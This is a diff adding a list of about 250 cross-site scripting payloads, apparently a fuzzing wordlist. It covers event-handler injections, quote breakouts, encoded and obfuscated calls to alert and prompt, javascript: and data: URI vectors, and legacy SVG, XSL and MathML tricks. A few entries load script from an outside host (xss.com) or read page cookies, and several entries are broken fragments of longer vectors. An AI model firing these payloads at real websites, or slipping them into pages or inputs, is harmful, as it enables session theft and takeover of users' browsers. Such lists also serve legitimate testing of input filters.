@@ -1,0 +1,254 @@
+"-prompt(8)-"
+'-prompt(8)-'
+";a=prompt,a()//
+';a=prompt,a()//
+'-eval("window['pro'%2B'mpt'](8)")-'
+"-eval("window['pro'%2B'mpt'](8)")-"
+"onclick=prompt(8)>"@x.y
+"onmouseover=alert(1)//
+"autofocus/onfocus=alert(1)//
+'-alert(1)-'
+'-alert(1)//
+\'-alert(1)//
+<x contenteditable onblur=alert(1)>lose focus! 
+<x onclick=alert(1)>click this! 
+<x oncopy=alert(1)>copy this! 
+<x oncontextmenu=alert(1)>right click this! 
+<x oncut=alert(1)>copy this! 
+<x ondblclick=alert(1)>double click this! 
+<x ondrag=alert(1)>drag this! 
+<x contenteditable onfocus=alert(1)>focus this! 
+<x contenteditable oninput=alert(1)>input here! 
+<x contenteditable onkeydown=alert(1)>press any key! 
+<x contenteditable onkeypress=alert(1)>press any key! 
+<x contenteditable onkeyup=alert(1)>press any key! 
+<x onmousedown=alert(1)>click this! 
+<x onmousemove=alert(1)>hover this! 
+<x onmouseout=alert(1)>hover this! 
+<x onmouseover=alert(1)>hover this! 
+<x onmouseup=alert(1)>click this! 
+<x contenteditable onpaste=alert(1)>paste here!
+%3Cx onxxx=alert(1) 
+<%78 onxxx=1 
+<x %6Fnxxx=1 
+<x o%6Exxx=1 
+<x on%78xx=1 
+<x onxxx%3D1
+<X onxxx=1 
+<x OnXxx=1 
+<X OnXxx=1 
+<x onxxx=1 onxxx=1
+<x/onxxx=1 
+<x%09onxxx=1 
+<x%0Aonxxx=1 
+<x%0Conxxx=1 
+<x%0Donxxx=1 
+<x%2Fonxxx=1 
+<x 1='1'onxxx=1 
+<x 1="1"onxxx=1
+<x </onxxx=1 
+<x 1=">" onxxx=1 
+<http://onxxx%3D1/
+<x onxxx=alert(1) 1='
+<math><brute href=javascript:alert(1)>click 
+<isindex action=javascript:alert(1) type=submit value=click> 
+<isindex formaction=javascript:alert(1) type=submit value=click> 
+<math><brute xlink:href=javascript:alert(1)>click 
+<base href=//0>
+alert`1`
+alert&lpar;1&rpar;
+alert&#x28;1&#x29
+alert&#40;1&#41
+(alert)(1)
+a=alert,a(1)
+[1].find(alert)
+top["al"+"ert"](1)
+top[/al/.source+/ert/.source](1)
+al\u0065rt(1)
+top['al\145rt'](1)
+top['al\x65rt'](1)
+top[8680439..toString(30)](1)
+navigator.vibrate(500)
+eval(URL.slice(-8))>#alert(1)
+eval(location.hash.slice(1)>#alert(1)
+<base draggable="true" ondrag="alert(1)">test</base>
+<base draggable="true" ondragend="alert(1)">test</base>
+<base draggable="true" ondragenter="alert(1)">test</base>
+<base draggable="true" ondragleave="alert(1)">test</base>
+<base draggable="true" ondragstart="alert(1)">test</base>
+<base id=x tabindex=1 onactivate=alert(1)></base>
+<base id=x tabindex=1 onbeforeactivate=alert(1)></base>
+<base id=x tabindex=1 onfocus=alert(1)></base>
+<base id=x tabindex=1 onfocusin=alert(1)></base>
+<base onbeforecopy="alert(1)" contenteditable>test</base>
+<base onbeforecut="alert(1)" contenteditable>test</base>
+<base onbeforepaste="alert(1)" contenteditable>test</base>
+<base onclick="alert(1)">test</base>
+<base oncontextmenu="alert(1)">test</base>
+<base oncopy="alert(1)" contenteditable>test</base>
+<base oncut="alert(1)" contenteditable>test</base>
+<base ondblclick="alert(1)">test</base>
+<base onkeydown="alert(1)" contenteditable>test</base>
+<base onkeypress="alert(1)" contenteditable>test</base>
+<base onkeyup="alert(1)" contenteditable>test</base>
+<base onmousedown="alert(1)">test</base>
+<base onmouseenter="alert(1)">test</base>
+<base onmouseleave="alert(1)">test</base>
+<base onmousemove="alert(1)">test</base>
+<base onmouseout="alert(1)">test</base>
+<base onmouseover="alert(1)">test</base>
+<base onmouseup="alert(1)">test</base>
+<base onpaste="alert(1)" contenteditable>test</base>
+<basefont draggable="true" ondrag="alert(1)">test</basefont>
+<basefont draggable="true" ondragend="alert(1)">test</basefont>
+<basefont draggable="true" ondragenter="alert(1)">test</basefont>
+<basefont draggable="true" ondragleave="alert(1)">test</basefont>
+<basefont draggable="true" ondragstart="alert(1)">test</basefont>
+<basefont id=x tabindex=1 onactivate=alert(1)></basefont>
+<basefont id=x tabindex=1 onbeforeactivate=alert(1)></basefont>
+<basefont id=x tabindex=1 onfocus=alert(1)></basefont>
+<basefont id=x tabindex=1 onfocusin=alert(1)></basefont>
+<basefont onbeforecopy="alert(1)" contenteditable>test</basefont>
+<basefont onbeforecut="alert(1)" contenteditable>test</basefont>
+<basefont onbeforepaste="alert(1)" contenteditable>test</basefont>
+<basefont onclick="alert(1)">test</basefont>
+<basefont oncontextmenu="alert(1)">test</basefont>
+<basefont oncopy="alert(1)" contenteditable>test</basefont>
+<basefont oncut="alert(1)" contenteditable>test</basefont>
+<basefont ondblclick="alert(1)">test</basefont>
+<basefont onkeydown="alert(1)" contenteditable>test</basefont>
+<basefont onkeypress="alert(1)" contenteditable>test</basefont>
+<basefont onkeyup="alert(1)" contenteditable>test</basefont>
+<basefont onmousedown="alert(1)">test</basefont>
+<basefont onmouseenter="alert(1)">test</basefont>
+<basefont onmouseleave="alert(1)">test</basefont>
+<basefont onmousemove="alert(1)">test</basefont>
+<basefont onmouseout="alert(1)">test</basefont>
+<basefont onmouseover="alert(1)">test</basefont>
+<basefont onmouseup="alert(1)">test</basefont>
+<basefont onpaste="alert(1)" contenteditable>test</basefont>
+<bgsound draggable="true" ondrag="alert(1)">test</bgsound>
+<bgsound draggable="true" ondragend="alert(1)">test</bgsound>
+<bgsound draggable="true" ondragenter="alert(1)">test</bgsound>
+<bgsound draggable="true" ondragleave="alert(1)">test</bgsound>
+<bgsound draggable="true" ondragstart="alert(1)">test</bgsound>
+<bgsound id=x tabindex=1 onactivate=alert(1)></bgsound>
+<bgsound id=x tabindex=1 onbeforeactivate=alert(1)></bgsound>
+<bgsound id=x tabindex=1 onfocus=alert(1)></bgsound>
+<bgsound id=x tabindex=1 onfocusin=alert(1)></bgsound>
+<bgsound onbeforecopy="alert(1)" contenteditable>test</bgsound>
+<bgsound onbeforecut="alert(1)" contenteditable>test</bgsound>
+<bgsound onbeforepaste="alert(1)" contenteditable>test</bgsound>
+<bgsound onclick="alert(1)">test</bgsound>
+<bgsound oncontextmenu="alert(1)">test</bgsound>
+<bgsound oncopy="alert(1)" contenteditable>test</bgsound>
+<bgsound oncut="alert(1)" contenteditable>test</bgsound>
+<bgsound ondblclick="alert(1)">test</bgsound>
+<bgsound onkeydown="alert(1)" contenteditable>test</bgsound>
+<bgsound onkeypress="alert(1)" contenteditable>test</bgsound>
+<bgsound onkeyup="alert(1)" contenteditable>test</bgsound>
+<bgsound onmousedown="alert(1)">test</bgsound>
+<bgsound onmouseenter="alert(1)">test</bgsound>
+<bgsound onmouseleave="alert(1)">test</bgsound>
+<bgsound onmousemove="alert(1)">test</bgsound>
+<bgsound onmouseout="alert(1)">test</bgsound>
+<bgsound onmouseover="alert(1)">test</bgsound>
+<bgsound onmouseup="alert(1)">test</bgsound>
+<bgsound onpaste="alert(1)" contenteditable>test</bgsound>
+<isindex draggable="true" ondrag="alert(1)">test</isindex>
+<isindex draggable="true" ondragend="alert(1)">test</isindex>
+<isindex draggable="true" ondragenter="alert(1)">test</isindex>
+<isindex draggable="true" ondragleave="alert(1)">test</isindex>
+<isindex draggable="true" ondragstart="alert(1)">test</isindex>
+<isindex id=x tabindex=1 onactivate=alert(1)></isindex>
+<isindex id=x tabindex=1 onbeforeactivate=alert(1)></isindex>
+<isindex id=x tabindex=1 onfocus=alert(1)></isindex>
+<isindex id=x tabindex=1 onfocusin=alert(1)></isindex>
+<isindex onbeforecopy="alert(1)" contenteditable>test</isindex>
+<isindex onbeforecut="alert(1)" contenteditable>test</isindex>
+<isindex onbeforepaste="alert(1)" contenteditable>test</isindex>
+<isindex onclick="alert(1)">test</isindex>
+<isindex oncontextmenu="alert(1)">test</isindex>
+<isindex oncopy="alert(1)" contenteditable>test</isindex>
+<isindex oncut="alert(1)" contenteditable>test</isindex>
+<isindex ondblclick="alert(1)">test</isindex>
+<isindex onkeydown="alert(1)" contenteditable>test</isindex>
+<isindex onkeypress="alert(1)" contenteditable>test</isindex>
+<isindex onkeyup="alert(1)" contenteditable>test</isindex>
+<isindex onmousedown="alert(1)">test</isindex>
+<isindex onmouseenter="alert(1)">test</isindex>
+<isindex onmouseleave="alert(1)">test</isindex>
+<isindex onmousemove="alert(1)">test</isindex>
+<isindex onmouseout="alert(1)">test</isindex>
+<isindex onmouseover="alert(1)">test</isindex>
+<isindex onmouseup="alert(1)">test</isindex>
+<isindex onpaste="alert(1)" contenteditable>test</isindex>
+<isindex type=image onload=alert(1) src=validimage.png>
+<isindex type=image src=1 onerror=alert(1)>
+<xss id=x tabindex=1 onactivate=alert(1)></xss>
+<xss id=x tabindex=1 onbeforeactivate=alert(1)></xss>
+<xss id=x tabindex=1 onfocus=alert(1)></xss>
+<xss id=x tabindex=1 onfocusin=alert(1)></xss>
+'%22--%3E%3C/style%3E%3C/script%3E%3Cscript%3Eshadowlabs(0x000045)%3C/script%3E
+<<scr\0ipt/src=http://xss.com/xss.js></script
+%27%22--%3E%3C%2Fstyle%3E%3C%2Fscript%3E%3Cscript%3ERWAR%280x00010E%29%3C%2Fscript%3E
+' onmouseover=alert(/XSS/)
+"><iframe%20src="http://google.com"%%203E
+<%73%63%72%69%70%74> %64 = %64%6f%63%75%6d%65%6e%74%2e%63%72%65%61%74%65%45%6c%65%6d%65%6e%74(%22%64%69%76%22); %64%2e%61%70%70%65%6e%64%43%68%69%6c%64(%64%6f%63%75%6d%65%6e%74%2e%68%65%61%64%2e%63%6c%6f%6e%65%4e%6f%64%65(%74%72%75%65)); %61%6c%65%72%74(%64%2e%69%6e%6e%65%72%48%54%4d%4c%2e%6d%61%74%63%68(%22%63%6f%6f%6b%69%65 = '(%2e%2a%3f)'%22)[%31]); </%73%63%72%69%70%74>
+%3Cscript%3Exhr=new%20ActiveXObject%28%22Msxml2.XMLHTTP%22%29;xhr.open%28%22GET%22,%22/xssme2%22,true%29;xhr.onreadystatechange=function%28%29{if%28xhr.readyState==4%26%26xhr.status==200%29{alert%28xhr.responseText.match%28/%27%28[^%27]%2b%29/%29[1]%29}};xhr.send%28%29;%3C/script%3E
+'';!--"<XSS>=&{()}
+\";alert('XSS');//
+<BGSOUND SRC="javascript:alert('XSS');">
+<LAYER SRC="http://ha.ckers.org/scriptlet.html"></LAYER>
+<XSS STYLE="xss:expression(alert('XSS'))">
+exp/*<XSS STYLE='no\xss:noxss("*//*");
+<BASE HREF="javascript:alert('XSS');//">
+getURL("javascript:alert('XSS')")
+a="get";
+<XML SRC="http://ha.ckers.org/xsstest.xml" ID=I></XML>
+<? echo('<SCR)';
+<svg%0Aonload=%09((pro\u006dpt))()//
+<w="/x="y>"/OndbLcLick=`<`[confir\u006d``]>z
+<D3/OnMouSEenTer=[2].find(confirm)>z
+<D3"<"/OncLick="1>[confirm``]"<">z
+<D3/OnpOinTeReENter=confirm``>click here
+<Z oncut=alert()>x
+<dETAILS%0aopen%0aonToGgle%0a=%0aa=prompt,a() x>
+>>> vectors()
+<!-- IE9+, FF4+, Opera 11.60+, Safari 4.0.4+, GC7+  -->
+<!-- IE 6-9 -->
+<?xml-stylesheet type="text/xsl" href="data:,%3Cxsl:transform version='1.0' xmlns:xsl='http://www.w3.org/1999/XSL/Transform' id='xss'%3E%3Cxsl:output method='html'/%3E%3Cxsl:template match='/'%3E%3Cscript%3Ealert(66)%3C/script%3E%3C/xsl:template%3E%3C/xsl:transform%3E"?>
+<animation xlink:href="javascript:alert(88)"/>
+<animation xlink:href="data:text/xml,%3Csvg xmlns='http://www.w3.org/2000/svg' onload='alert(88)'%3E%3C/svg%3E"/>
+<foreignObject xlink:href="javascript:alert(88)"/>
+<foreignObject xlink:href="data:text/xml,%3Cscript xmlns='http://www.w3.org/1999/xhtml'%3Ealert(88)%3C/script%3E"/>
+<!-- Up to Opera 11.64 - see link below -->
+<!-- Up to Opera 12.x -->
+<handler xmlns:ev="http://www.w3.org/2001/xml-events" ev:event="load">alert(94)</handler>
+<!-- IE 10 in IE5-9 Standards mode -->
+*{color:gre/**/en !/**/important} /* IE 6-9 Standards mode */
+<!--
+--><!--*{color:red}   /* all UA */
+*{background:url(xx:x //**/\red/*)} /* IE 6-7 Standards mode */
+<x xmlns="http://www.w3.org/2001/xml-events" event="load" observer="foo" handler="data:image/svg+xml,%3Csvg%20xmlns%3D%22http%3A%2F%2Fwww.w3.org%2F2000%2Fsvg%22%3E%0A%3Chandler%20xml%3Aid%3D%22bar%22%20type%3D%22application%2Fecmascript%22%3E alert(104) %3C%2Fhandler%3E%0A%3C%2Fsvg%3E%0A#bar"/>
+<!-- IE 5-9 standards mode -->
+<rect  fill="white" style="clip-path:url(test3.svg#a);fill:url(#b);filter:url(#c);marker:url(#d);mask:url(#e);stroke:url(#f);"/>
+<path d="M0,0" style="marker-start:url(test4.svg#a)"/>
+<xml:namespace prefix="t">
+<import namespace="t" implementation="#default#time2">
+xmlns:svg="http://www.w3.org/2000/svg">
+<?xml-stylesheet type="text/xml" href="#stylesheet"?>
+<!DOCTYPE doc [
+<!ATTLIST xsl:stylesheet id    ID    #REQUIRED>]>
+<listener event="load" handler="#y" xmlns="http://www.w3.org/2001/xml-events" observer="x"/>
+<handler id="y">alert(127)</handler>
+<math>
+<maction actiontype="statusline#http://google.com" xlink:href="javascript:alert(2)">CLICKME</maction>
+<maction actiontype="statusline" xlink:href="javascript:alert(3)">CLICKME<mtext>http://http://google.com</mtext></maction>
+feed:data:text/html,&#x3c;script>alert('Top Page Location: '+document.location+' Host Page Cookies: '+document.cookie)&#x3c;/script>&#x3c;b>
+<%
+<stylesheet xmlns="http://www.w3.org/TR/WD-xsl">
+<eval>new ActiveXObject(&apos;htmlfile&apos;).parentWindow.alert(135)</eval>
+<if expr="new ActiveXObject('htmlfile').parentWindow.alert(2)"></if>
+<circle r="400"></circle>
+<marguee/onstart=alert(1)>
